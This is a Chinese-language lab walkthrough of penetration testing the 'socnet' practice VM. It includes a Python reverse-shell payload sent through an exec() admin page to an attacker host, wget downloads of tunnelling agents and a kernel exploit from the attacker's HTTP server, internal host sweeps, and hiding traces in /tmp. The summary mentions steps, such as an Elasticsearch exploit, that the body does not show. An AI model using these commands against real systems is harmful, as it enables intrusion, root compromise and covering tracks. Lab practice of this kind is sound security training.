## 2.操作记录

### 2.1 主机发现&信息收集

由于靶机和`kali`在同一网段，所以采用`arp-sacn -l`扫描网段主机，其中192.168.0.114是本机，猜测192.168.0.113是靶机。

![](../Images/5151920e8a3ff3fea236603593fa2cc8.png)

`nmap -sT -Pn 192.168.0.113`探测发现113主机开放了22和5000端口  

`nmap -p22,5000 -sV -sT -Pn 192.168.0.113`进一步探测端口上的服务

*   发现22端口是ssh
    
*   5000端口上的是`http`服务
    
*   主机是`ubuntu`系统，主机上存在python环境
    
*   ![](../Images/a3bb72346fd656e455f49fb48e83ccea.png)
    

访问5000端口，看下web服务，页面如下，测试没有什么突破点，仅仅可以输入输出  

![](../Images/d1f8c2f5fcbfaa2c2ba0b0ecf735c20f.png)

由于是http服务，猜测可能存在其他隐藏路径，使用`dirsearch -u http://192.168.0.113:5000`扫描下路径,扫描发现存在`/admin`路径  

![](../Images/9dda9f9fda719d309846d8b6784e8aad.png)

![](../Images/4ec0d048b61a3688d7572657d56a077e.png)

访问界面发现这是一个代码测试页面，会将接收到的代码放到`exec()`进行执行

```
exec() 
Python 内建函数

定义和用法
exec() 函数执行指定的 Python 代码。
exec() 函数接受大量代码块，这与 eval() 函数仅接受单个表达式不同
```

可以执行python脚本反弹shell，我们可以浏览器搜索`python反弹shell`很容易找到相关代码,下面是随便找一个，需要修改`ip`地址和端口为我们正在操作的`kali`的`ip`和监听的端口

```
//payload
import socket,subprocess,os 

s\=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM) 
s.connect(("192.168.0.114",6666))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1) 
os.dup2(s.fileno(),2) 
p\=subprocess.call(\["/bin/sh","-i"\])
```

在输入payload之前我们**首先**需要在`kali`上启动监听`nc -nvlp 6666`以便接收shell，然后输入payload，点击`Test code`执行代码

![](../Images/e4fe594d270731677180d29490b73963.png)

![](../Images/91222a23fd52d6de6fb2d1fc628c6e76.png)

提交之后，`kali`接受到反弹的shell,用`id`查下权限，用`ls`查下文件，发现是`root`权限,但查看文件时发现了一个`Dockerfile`文件,猜测可能时`docker`主机，需要进一步确认  

*   查看`Dockerfile`文件`cat Dockerfile`，内容如下，判断可能是docker
    

```
#docker build -t socnet .
#docker run -td --rm -p 8080:8080 socnet
FROM python:2.7-alpine
COPY . /app
WORKDIR /app
RUN pip install -r requirements.txt
CMD \["python", "/app/main.py"\]
```

*   进一步判断，查看根目录下是否有`dockerenv`,`ls /.dockerenv`,发现存在，判断90%是docker容器
    
*   最后判断，`cat /proc/1/cgroup`，如果`cgroup`内有`docker`文件判断就是docker容器
    
*   判断依据：`Linux`初始化进程时，`PID=1`代表的是初始化进程的ID，如果1进程下面的`cgroup`文件包含docker文件，就说明这是个docker系统
    

![](../Images/61dd8bc40344022b30ce0bde4071da3f.png)

### 2.2 内网发现

查看下当前`ip`，发现并不是192.168.0.113，而是172.17.0.3，说明这是一台内网的docker主机，自然而然的我们会想到将内网主机过滤下，看哪些存活

*   方法：使用for循环来ping主机 ,我们使用linux发现一个网段就行，正常测试时要访问所有
    

```
//windows
//发现一个网段
for /l %i in (1,1,10) do ping \-n 1 172.17.0.%i

//发现两个网段
for /l %i in (1,1,3) do for /l %j in (1,1,3) do ping \-n 1 192.168.%i.%j

//linux
//发现一个网段
for i in $(seq 1 10);do ping \-c 1 172.17.0.$i;done

//发现两个网段
for i in $(seq 1 10);do (for j in $(seq 1 10 );do ping \-c 1 172.17.$i.$j;done)done
```

![](../Images/4b63ffe7ef3067fa4e42eac1ec2dd1ad.png)

经过我们测试，发现内网只有三台主机，172.17.0.1、172.17.0.2、172.17.0.3，其中3是目前所在的靶机。  

  

### 2.3 内网穿透

在发现了内网主机之后，我们需要对它们进行扫描，来判断各个主机上面的情况，但我们和内网默认是无法通信的，此时就需要做内网穿透，做个代理，让我们能够访问到内网主机。

我们使用`Venom`穿透工具来实现此功能

下载地址：https://github.com/Dliv3/Venom/releases

工具文件如下,由于靶机是ubuntu，我们需要使用的文件是`admin_linux_x64和agent_linux_x64`,`admin`放在本地，`agent`需要搞到靶机上

![](../Images/17ae2cef001ce205823e89451e654115.png)

kali服务端开启端口监听：`./admin_linux_x64 -lport 7777`  

![](../Images/7f3aba141b8b4845a7e47a4dd9ae017e.png)

进到`Venmo`文件夹下，开启`http`服务：`python3 -m http.server 81`，这一步是为了让靶机能够下载agent文件，端口哪个都行  

![](../Images/3840a45323a629858b2c567b66259aa3.png)

靶机下载kali上的agent\_linux\_x64到本机：`wget http://192.168.0.114:81/agent_linux_x64`  

![](../Images/be391331337ca226bdb0046651a867c4.png)

客户端服务开启：  

`chmod +x agent_linux_x64`给予执行权限

`./agent_linux_x64 -rhost 192.168.0.114 -rport 7777`这个要和刚才监听的端口一致

![](../Images/92f2b13a081235cf358a5a5864af5332.png)

客户端设置好了之后，`kali`上服务端就会收到链接，使用`show`命令可以看到链接已经建立，`goto 1`转到节点，同时另外启动一个侦听端口`socks 1080`，方便我们链接进来  

![](../Images/6188980faf0f81f8e23628e7392e9e42.png)

至此代理就已经设置好了。  

  

### 2.4 代理利用

为了能让`kali`上的所有工具都能利用代理,需要使用另一个工具`proxychains`

修改`vim /etc/proxychains4.conf`挂载代理，就可以让kali上的工具访问到靶机了

将文件内`socks4 127.0.0.1 9050`修改为`socks5 127.0.0.0 1080`

![](../Images/711a6f1826108a53e7ee089c338e27c5.png)

以后工具使用代理只需要在前面写上`proxychains`就好

### 2.6 本地提权

提权常用的是利用linux内核来提权，刚才登陆时可以看到内核版本,也可以使用命令`uname -a`来查看内核版本

```
uname -a
Linux socnet 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86\_64 x86\_64 x86\_64 GNU/Linux
```

`kali`本地搜索内核版本查找exp，`searchsploit linux 3.13`

![](../Images/408dc862880228e1ed2e8c969bf9cb77.png)

选择`37292.c`来利用,首先将文件复制到当前文件夹下  

`cp /usr/share/exploitdb/exploits/linux/local/37292.c .`

![](../Images/467a8b728bef350e9f0fd208c7c794d9.png)

`vim 37292.c`:查看下exp代码发现代码末尾会调用gcc来编译`ofs-lib.c`文件，这个操作在192.168.0.113靶机上是会报错的，因为靶机上没有`gcc`环境  

![](../Images/2ebc0b50769987b55f3fec5bc6df0af1.png)

改正措施  

我们可以把`ofs-lib.os`文件和exp文件一同上传到靶机，改成只是调用文件，编译代码操作我们在`kali`本地完成,这时代码里的编译文件的代码也就不需要了，删除方框内编译代码即可。

![](../Images/ca5b18efd36afbc12deb462a6491d3cf.png)

本地编译`gcc -o exp2 37292.c`  

寻找编译过后的`ofs-lib.so`文件，看是否存在，`find /usr -nmae ofs-lib.so`,存在直接复制到当前文件夹下

![](../Images/3400b20032f12f182e7dc5f372baa67f.png)

下面需要开启一个http服务，以便靶机能够把提权文件下载下来  

`python3 -m http.server 81`

![](../Images/996a210deed3bf81041979b599f44602.png)

有一点需要注意，我们下载的文件需要放在`tmp`目录下，因为提权文件里写的路径是`/tmp`，而且tmp是存放临时文件的，会消除我们上传的文件，有利于隐藏攻击  

![](../Images/cc78c1a70710a201dc9a4082411038d5.png)

进到tmp目录下给exp2赋予执行权限`chmod +x exp2`  

执行`exp2`，查看权限，已经是root了，打靶完成

![](../Images/12d4ff848a09b49837dd43a835ce9f34.png)

## 3.回顾总结

**寻找目标**

靶机和`kali`在同一网段，直接采用`arp-sacn -l`扫描主机；也可以采用`nmap`扫描

**收集信息**

发现靶机的端口，服务,利用`dirsearch -u http://192.168.0.113:5000`扫描目录发现`/admin`路径;其他扫描工具也可以

**验证测试**

测试`/admin`存在代码执行漏洞，直接传python代码反弹shell拿到web权限

**当前主机分析**

由于靶机描述存在Docker,且发现`Dockerfile`文件，猜测是Docker容器，看ip发现在内网，可以进行横向发现

**进入内网&内网穿透**

内网发现三台存活主机，继续进行信息收集，由于在内网，使用Venom做内网穿透，配置`proxychains4`方便工具利用穿透代理；

**内网信息收集**

连接代理，对内网其他主机进行扫描，发现172.17.0.1是靶机主体，发现172.17.0.2上存在`Elasticsearch`低版本代码执行漏洞；

**`kali`漏洞`exp`利用**

拿下172.17.0.2后发现上面存有账户密码，解密，测试，发现主机一普通账户

**账户本地提权**

收集信息知道靶机`linux`内核版本不高，存在越权漏洞，靶机下载`kali`上的越权文件实现本地越权。

**痕迹隐藏**

操作集中在`/tmp`夹下，linux会定时清理这文件夹下的文件，方便隐藏痕迹。

  

总的来看，渗透似乎仅仅是信息收集，信息利用，但想很好的完成这两步还需走很长的路，加油！！！
